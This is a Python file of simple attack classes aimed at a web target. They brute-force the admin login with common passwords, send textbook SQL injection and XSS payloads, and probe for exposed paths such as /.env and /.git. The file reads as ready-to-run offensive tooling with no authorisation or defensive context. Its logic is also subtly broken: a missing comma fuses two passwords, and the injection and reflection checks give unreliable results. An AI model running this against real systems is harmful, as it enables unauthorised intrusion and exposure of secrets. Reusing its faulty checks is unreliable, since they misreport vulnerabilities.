import requests

class ExploitBase:
    """ Base class for all exploits, containing common functionality. """
    def __init__(self, url):
        self.url = url

    def send_request(self, data):
        """ Helper method to send requests to the server. """
        try:
            response = requests.post(self.url, data=data)
            return response.text
        except requests.RequestException as e:
            return str(e)

class WeakPasswordExploit(ExploitBase):
    common_passwords = ['123456', 'password', 'admin', 'letmein' 'qwerty']

    def run(self):
        for password in self.common_passwords:
            response = self.send_request({'username': 'admin', 'password': password})
            if "Welcome" in response:
                return f"Weak password found: {password}", "white"
        return "No weak passwords succeeded.", "green"

class SQLInjectionExploit(ExploitBase):
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]

    def run(self):
        vulnerabilities = []
        for payload in self.payloads:
            response = self.send_request({'username': payload, 'password': 'password'})
            if "error" not in response:
                vulnerabilities.append(f"SQL Injection vulnerability detected with payload: {payload}")
        
        if vulnerabilities:
            return "\n".join(vulnerabilities), "white"
        return "No SQL Injection vulnerabilities detected.", "green"


class XSSAttackExploit(ExploitBase):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='invalid' onerror='alert(\"XSS\")'>",
        "<a href=\"javascript:alert('XSS')\">Click me</a>"
    ]

    def run(self):
        vulnerabilities = []
        for payload in self.payloads:
            response = self.send_request({'data': payload})
            if self.is_payload_reflected(response, payload):
                vulnerabilities.append(f"XSS vulnerability detected with payload: {payload}")
        
        if vulnerabilities:
            return "\n".join(vulnerabilities), "white"
        return "No XSS vulnerabilities detected.", "green"

    def is_payload_reflected(self, response, payload):
        if payload.strip('<>').split(' ')[0] in response:
            return True
        return False





class SensitivePathsExploit(ExploitBase):
    paths = ["/admin", "/config", "/db", "/.env", "/.git"]

    def run(self):
        for path in self.paths:
            full_url = f"{self.url}{path}"
            response = requests.get(full_url)
            if response.status_code == 200:
                return f"Sensitive path accessible: {path}", "white"
        return "No accessible sensitive paths found.", "green"
